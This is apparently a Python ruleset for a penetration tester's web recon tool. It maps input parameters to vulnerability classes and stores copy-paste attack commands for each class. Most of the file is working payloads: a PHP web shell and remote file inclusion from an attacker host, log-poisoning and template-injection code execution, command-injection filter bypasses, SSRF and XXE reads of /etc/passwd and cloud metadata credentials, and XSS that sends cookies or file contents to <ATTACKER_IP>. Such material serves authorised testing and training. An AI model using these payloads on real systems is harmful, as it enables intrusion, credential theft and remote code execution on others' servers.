"""
web_recon_heuristics.py

Heuristic ruleset for the passive web recon classifier.
Maps discovered input surfaces (param names / field types / contexts) to CANDIDATE
vulnerability classes, and provides the operator's own pastable MANUAL commands per class.

PASSIVE / OUTPUT-ONLY. Nothing here is executed by the tool. These templates are PRINTED
for the operator to copy and run manually. No auto-exploitation, no scanner invocation.

Placeholders the crawler fills where known: <TARGET>, <PAGE>, <PARAM>, <FILE>, <COMMAND>,
<ATTACKER_IP>, <PORT>, <BASELINE>, <SIZE>, <REGEX>, <B64>, <SUCCESS_STRING>, <FAILURE_STRING>.
Leave any it can't resolve as the literal placeholder.
"""

# ---------------------------------------------------------------------------
# Candidate-class triggers. Matched against param names (substring, case-insensitive),
# field types, and context flags the crawler sets (e.g. accepts_xml, is_file_input,
# is_free_text, is_numeric, from_options_header).
# ---------------------------------------------------------------------------

PARAM_NAME_TRIGGERS = {
    "file_inclusion": [
        "page", "file", "language", "lang", "doc", "path", "pg",
        "template", "view", "include", "root", "read", "download", "folder",
    ],
    "ssrf": [
        "url", "dest", "server", "image", "fetch", "webhook", "callback",
        "uri", "next", "redirect", "return", "continue", "site", "domain",
    ],
    "command_injection": [
        "cmd", "exec", "ping", "host", "ip", "query", "filename", "run",
    ],
    "idor": [
        "id", "uid", "user", "account", "contract", "doc_id", "order",
        "num", "number", "userid", "user_id",
    ],
}

# Context-flag triggers (set by crawler during Phase 2 inventory)
CONTEXT_TRIGGERS = {
    "file_upload": ["is_file_input", "is_multipart_form"],
    "xxe": ["accepts_xml", "upload_xml_family"],   # .xml/.svg/.docx/.xlsx, Content-Type xml, SOAP/REST xml, sitemap/RSS import
    "xss": ["is_free_text", "is_search_field"],
    "ssti": ["is_free_text", "reflects_in_template_context"],  # operator confirms reflection manually
    "verb_tampering": ["from_options_header", "any_endpoint"],
}

# Free-text / search fields map to BOTH xss and ssti (both hinge on reflection,
# which the operator confirms manually).
FREE_TEXT_CLASSES = ["xss", "ssti"]

# ---------------------------------------------------------------------------
# Pastable command/payload templates per class (operator's own syntax).
# "canonical" = shown by default (minimal). "verbose" = only with --verbose,
# written to manual_checks.md. Nothing here is run by the tool.
# ---------------------------------------------------------------------------

PASTABLES = {

    "file_inclusion": {
        "why": "param name matches dynamic file-inclusion pattern",
        "canonical": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=<FILE>",
            # curl note: use --path-as-is so the LFI portion isn't stripped
            "curl -sko- --path-as-is 'http://<TARGET>/<PAGE>?<PARAM>=../../../../etc/passwd'",
            # primary parameter+LFI ffuf (operator runs manually)
            "ffuf -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <BASELINE>",
        ],
        "verbose": [
            # traversal filter bypasses
            "..././..././..././etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "../../../../etc/passwd%00.php",            # PHP <5.5 null byte
            # windows
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # find existing .php for wrapper source-read
            "feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --depth 5 --scan-dir-listings -x php --insecure -u http://<TARGET>",
            # param discovery
            "ffuf -u 'http://<TARGET>/<PAGE>?FUZZ=../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mr 'root:'",
            # RFI (rare)
            "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php ; python3 -m http.server 8080",
            "curl -sko- 'http://<TARGET>/<PAGE>?<PARAM>=http://<ATTACKER_IP>:8080/shell.php&cmd=<COMMAND>'",
            # wrapper RCE (data)
            "curl -sko- 'http://<TARGET>/<PAGE>?<PARAM>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=<COMMAND>'",
            # log poisoning
            "curl -s --user-agent '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET>/",
            "GET /<PAGE>?<PARAM>=....//....//....//var/log/apache2/access.log&cmd=id",
        ],
        "note": "Forced-extension? pivot to php://filter to read source. str_replace('../') filter? use ....// . Log poison: use ONE clean PHP one-liner (bad PHP breaks the log permanently).",
    },

    "command_injection": {
        "why": "param name feeds a system command",
        "canonical": [
            ";id", "|id", "`id`", "$(id)", "&&id",
        ],
        "verbose": [
            # from your escalation ladder
            "c'a't${IFS}/etc/passwd",                         # L1 space+quote
            "c'a't%09/etc/passwd",
            "c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd",     # L2 slash blocked
            "<FIELD_DATA>%0ac'a't%09${PATH:0:1}etc${PATH:0:1}passwd",  # L3 newline
            "<FIELD_DATA>%0abash<<<$(base64%09-d<<<<B64>)",   # L4 base64 full bypass
            "$IFS%26c'a't$IFS${PATH:0:1}etc${PATH:0:1}passwd",# L5 chained param (&)
            # windows
            "who^ami",
        ],
        "note": "Start from a WORKING input, add ONE new char at a time, keep a good/bad char list. Windows: ';' works in PowerShell, not CMD.",
    },

    "ssrf": {
        "why": "param fetches a remote resource",
        "canonical": [
            "http://127.0.0.1/admin",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # blind confirm
            "nc -lvnp 8080   # then:  ?<PARAM>=http://<ATTACKER_IP>:8080/ping",
        ],
        "verbose": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "//evil.com",                                     # open redirect
            "https://evil.com",
            # PDF-renderer SSRF->LFI (from your notes)
            "<script>x=new XMLHttpRequest;x.onload=function(){document.location='http://<ATTACKER_IP>:8080?c='+btoa(this.responseText)};x.open('GET','file:///etc/passwd');x.send();</script>",
        ],
        "note": "Blind? confirm via OOB callback (nc / interactsh). PDF renderer? try file:///, /proc/self/environ, /etc/hosts.",
    },

    "ssti": {
        "why": "free-text input reflected in a rendered/formatted response",
        "canonical": [
            "${{7*7}}", "{{7*'7'}}", "#{7*7}", "<%= 7*7 %>",
        ],
        "verbose": [
            # engine RCE (from your notes) -- only after fingerprint
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",  # Jinja2
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",   # Twig
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",                    # Freemarker
            "<%= `id` %>",                                                                                # ERB
        ],
        "note": "MANUALLY confirm reflection first. Fingerprint: {{7*'7'}} => 7777777 Jinja2 / 49 Twig.",
    },

    "xxe": {
        "why": "input vector parses XML (xml content-type / .xml/.svg/.docx upload / SOAP/REST / importer)",
        "canonical": [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY probe "TESTSTRING">]><root><field>&probe;</field></root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        "verbose": [
            '<!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">]><root><email>&xxe;</email></root>',
            # XXE->SSRF
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            # blind OOB confirm
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<ATTACKER_IP>:8080/ping">]><foo>&xxe;</foo>',
            # SVG upload file-read
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>',
        ],
        "note": "MANUALLY confirm TESTSTRING reflects. Check Page Source for reflected data. file:// blocked? try php://, expect://, gopher://.",
    },

    "file_upload": {
        "why": "file input / multipart upload form",
        "canonical": [
            "shell.php  shell.phtml  shell.php.jpg  shell.jpg.php",
            "magic-byte prefix: GIF89a;   spoof Content-Type: image/jpeg",
        ],
        "verbose": [
            # your ffuf-by-parts clusterbomb workflow (operator runs manually, from req.txt)
            "ffuf -request-proto http -request req_single_ext.txt -mode clusterbomb -w extensions.lst:EXT -w content-types.txt:CTYPE -w magicbytes.txt:MAGIC -od ffuf_uploads_single -mr '<SUCCESS_STRING>'",
            "ffuf -w extensions.lst:EXT -u 'http://<TARGET>/<PAGE>/shellEXT?cmd=id' -mr 'uid=' -v",
        ],
        "note": "Capture upload req in proxy -> req.txt. Build extensions/content-types/magicbytes wordlists first. Find upload dir via feroxbuster if not known.",
    },

    "xss": {
        "why": "free-text/search input, or param reflected in rendered DOM",
        "canonical": [
            "<script>alert(window.origin)</script>",
            '"><img src=x onerror=alert(window.origin)>',
            "<svg/onload=alert(window.origin)>",
        ],
        "verbose": [
            # polyglot breaker
            'javascript:"/*\\"/*`/*\' /*</title></textarea>--></noscript></style></xmp>"></a><img src=x onerror=alert(window.origin)>//',
            # remote / exfil
            '<script src="http://<ATTACKER_IP>/script.js"></script>',
            "document.location='http://<ATTACKER_IP>/index.php?c='+document.cookie;",
            "new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie;",
        ],
        "note": "MANUALLY confirm reflection: Page Source (CTRL+U, pre-exec) vs Inspect (F12, post-exec). document.cookie only if HttpOnly is OFF. Blind XSS: use your PHP callback-server workflow.",
    },

    "idor": {
        "why": "numeric / sequential object reference param",
        "canonical": [
            "ffuf -u 'http://<TARGET>/api/user/FUZZ' -w <(seq 0 50) -mr '<REGEX>'",
        ],
        "verbose": [
            "ffuf -request-proto http -request request.txt -w <(seq 1 10) -mr '<REGEX>'",
            # encoded-ID iteration (b64/md5) -- from your notes
            "for i in {1..20}; do B64_ID=$(echo -n \"$i\" | base64 -w 0); curl -sJo- \"http://<TARGET>/download.php?contract=$B64_ID\"; done",
        ],
        "note": "Don't forget the Cookie header. Try increment/decrement and swapping to another known ID.",
    },

    "verb_tampering": {
        "why": "endpoint may honor alternate HTTP verbs",
        "canonical": [
            "curl -X OPTIONS -i 'http://<TARGET>/*'",
        ],
        "verbose": [
            "{ curl -s -I -X OPTIONS <TARGET> | grep -i 'allow:' | cut -d':' -f2 | tr ',' '\\n' | tr -d ' ' ; echo 'GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT DEBUG' | tr ' ' '\\n'; } | sort -u > http_methods.txt",
            "ffuf -w ./http_methods.txt -X FUZZ -u <TARGET>",
        ],
        "note": "If auth uses only HTTP headers, try HEAD/OPTIONS to bypass. Swap GET<->POST.",
    },
}

# ---------------------------------------------------------------------------
# Classifier entry point (pure mapping; NO network, NO execution).
# ---------------------------------------------------------------------------

def classify_input(param_name=None, context_flags=None):
    """
    Return a list of candidate class keys for a discovered input surface.
    param_name: str or None
    context_flags: set[str] or None (e.g. {'is_file_input'}, {'accepts_xml'}, {'is_free_text'})
    Pure function: matches triggers only. Operator runs the emitted pastables manually.
    """
    context_flags = context_flags or set()
    candidates = []

    if param_name:
        p = param_name.lower()
        for cls, needles in PARAM_NAME_TRIGGERS.items():
            if any(n in p for n in needles):
                candidates.append(cls)

    for cls, flags in CONTEXT_TRIGGERS.items():
        if any(f in context_flags for f in flags):
            candidates.append(cls)

    if "is_free_text" in context_flags or "is_search_field" in context_flags:
        for cls in FREE_TEXT_CLASSES:
            if cls not in candidates:
                candidates.append(cls)

    # dedupe, preserve order
    seen = set()
    return [c for c in candidates if not (c in seen or seen.add(c))]


def pastables_for(class_key, verbose=False):
    """Return dict with why/note + canonical (+ verbose) pastables for a class. Output only."""
    entry = PASTABLES.get(class_key)
    if not entry:
        return None
    out = {
        "why": entry.get("why", ""),
        "note": entry.get("note", ""),
        "commands": list(entry.get("canonical", [])),
    }
    if verbose:
        out["commands"] += list(entry.get("verbose", []))
    return out
